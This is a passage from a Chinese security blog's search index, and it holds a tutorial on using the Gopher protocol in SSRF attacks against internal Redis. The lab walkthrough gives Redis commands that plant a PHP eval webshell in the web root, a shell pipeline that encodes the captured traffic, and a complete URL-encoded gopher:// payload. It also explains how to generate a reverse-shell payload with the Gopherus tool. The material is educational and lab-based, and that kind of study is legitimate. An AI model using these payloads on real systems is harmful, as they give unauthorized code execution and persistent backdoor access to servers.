src="https://img-blog.csdnimg.cn/20200402193151206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集的作用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF利用Gopher协议拓展攻击面</title>
      <link href="/2020/03/30/SSRF%E5%88%A9%E7%94%A8Gopher%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2/"/>
      <url>/2020/03/30/SSRF%E5%88%A9%E7%94%A8Gopher%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="0×00概述"><a href="#0×00概述" class="headerlink" title="0×00概述"></a>0×00概述</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</span><br><span class="line"></span><br><span class="line">gopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）</span><br><span class="line"></span><br><span class="line">Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。</span><br><span class="line"></span><br><span class="line">不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%<span class="number">0</span>d%<span class="number">0</span>a。</span><br><span class="line"></span><br><span class="line">注意post参数之间的&amp;分隔符也要进行url编码</span><br><span class="line"></span><br><span class="line">基本协议格式：URL:gopher:<span class="comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span></span><br></pre></td></tr></table></figure><h2 id="0×01-环境搭建"><a href="#0×01-环境搭建" class="headerlink" title="0×01 环境搭建"></a>0×01 环境搭建</h2><p>Centos 靶机</p><p>Kali攻击机</p><p>Redis[文中会介绍安装]Gopherus.py [<a href="https://github.com/tarunkant/Gopherus]" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus]</a></p><h2 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">那么我们试试看Gopher协议最经典的攻击方式，很多服务默认都不会在公网开启，一般都是仅仅允许本地访问，例如Redis，Redis因为配置不当会造成未授权访问，攻击者可以读取敏感信息，写入文件（不知道的同学可以去补一下这块的知识）</span><br><span class="line"></span><br><span class="line">因为gopher协议传参方式是TCP数据流，那么我们可以尝试使用tcpdump或者直接使用Wireshark进行捕捉TCP的传输。</span><br><span class="line"></span><br><span class="line">我们现在攻击机上安装一个redis 【安装方法有很多，可以用wget安装，也可以用apt-get install 安装】【可以参考https:&#x2F;&#x2F;www.cnblogs.com&#x2F;langtianya&#x2F;p&#x2F;5187681.html】我因为是Kali直接apt-get install搞定的。安装成功后会出现这个开心页面的页面</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200330030042852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后我们再开一个窗口，输入redis-cli [进入redis的终端]，然后输出ping 如果返回PONG 那么就是成功了.</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020033003010231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后我们再进行一些Redis未授权访问的攻击，其中危害最大的莫过于是直接写入Webshell和利用计划任务执行命令反弹shell，这个命令一般Centos容易复现。我们打开我们的抓包工具。</span><br><span class="line"></span><br><span class="line">我这里用Wireshark吧。我们先让他去抓lo这个网卡。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200330030122696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后去执行Redis的恶意语句。（/home/wwwroot/<span class="keyword">default</span>/这个目录必须和目标主机相同）</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /home/wwwroot/<span class="keyword">default</span>/</span><br><span class="line">config set dbfilename <span class="string">"shell.php"</span></span><br><span class="line">set gaia <span class="string">"&lt;?php eval($_POST[a]);?&gt;"</span></span><br><span class="line">save</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200330030147169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/home/wwwroot/<span class="keyword">default</span>是网站的根目录，这个可以根据网页报错找到，</span><br><span class="line">也可以使用file:<span class="comment">///协议去读取敏感文件去获取网站根目录。</span></span><br><span class="line">[如果第一条执行不了，可能是你的攻击机器没有这个目录，创建一下就行]</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">打开Wireshark然后右键追踪流里面，有个TCP流，里面感觉有很多数据，</span><br><span class="line">不要害怕，记得去选中我们发送过去的数据【因为我们Redis有数据回显】</span><br><span class="line"></span><br><span class="line">用wireshark 打开找到发送redis 命令的包然后追踪流，以原始数据保存到a.txt</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200330030409276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用如下命令将原始数据a.txt 的内容进行编码，后使用gopher 协议发送到<span class="number">6379</span> 端口</span><br><span class="line"></span><br><span class="line">cat a.txt|xxd -plain|sed -r <span class="string">'s/(..)/%\1/g'</span>|tr -d <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">gopher:<span class="comment">//127.0.0.1:6379/%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%32%32%0d%0a%2f%68%6f%6d%65%2f%77%77%77%72%6f%6f%74%2f%64%65%66%61%75%6c%74%2f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%34%0d%0a%67%61%69%61%0d%0a%24%32%34%0d%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200330030441774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200330030453795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200330030502746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">好不容易拿了一个Webshell,这样子真的是异常的麻烦，</span><br><span class="line">于是乎有前辈写过一个脚本，gopherus.py,在github可以下载。</span><br><span class="line">[这个工具支持多种Gopher协议生成攻击代码]下载好后直接使用</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020033003052053.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们选中redis模块[python gopherus.py --exploit redis] </span><br><span class="line">  然后很贴心的问我要webshell还是反弹shell，然后让我们写接受反弹shell的Ip</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200330030529558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">虽然最后出了点小问题，但是他有显示了POC代码，直接复制粘贴就行，</span><br><span class="line">这里监听的是<span class="number">1234</span>端口。那我们监听<span class="number">1234</span>端口吧！</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200330030539806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">成功获得反弹Shell，不需要各种抓包、转码多开心。</span><br><span class="line">Gopherus.py还支持几种未授权访问的方法，总的来说还不错。</span><br><span class="line">可以都去试一试，很多非加密访问的未授权访问都可以尝试使用Gopher协议去尝试利用!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF服务器端请求伪造 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
